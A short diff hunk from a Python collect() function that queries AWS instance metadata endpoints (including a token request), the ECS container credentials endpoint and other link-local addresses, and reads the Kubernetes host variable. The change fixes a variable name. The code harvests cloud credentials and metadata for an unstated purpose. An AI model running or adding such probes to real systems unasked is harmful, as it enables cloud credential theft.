@@ -21,7 +21,7 @@ def collect():
     out["imds_v6"]=get("http://[fd00:ec2::254]/latest/meta-data/")
     out["imds_v6_tok"]=get("http://[fd00:ec2::254]/latest/api/token", headers={"X-aws-ec2-metadata-token-ttl-seconds":"60"}, method="PUT")
     out["ecs_creds"]=get("http://169.254.170.2/v2/credentials")
-    out["imds_other"]={ip:get(f"http://169.254.169.{i}/latest/meta-data/") for i in (250,251,252,253,255)}
+    out["imds_other"]={i:get(f"http://169.254.169.{i}/latest/meta-data/") for i in (250,251,252,253,255)}
     out["kube_env_host"]=os.environ.get("KUBERNETES_SERVICE_HOST")
     kh=os.environ.get("KUBERNETES_SERVICE_HOST")
     if kh:
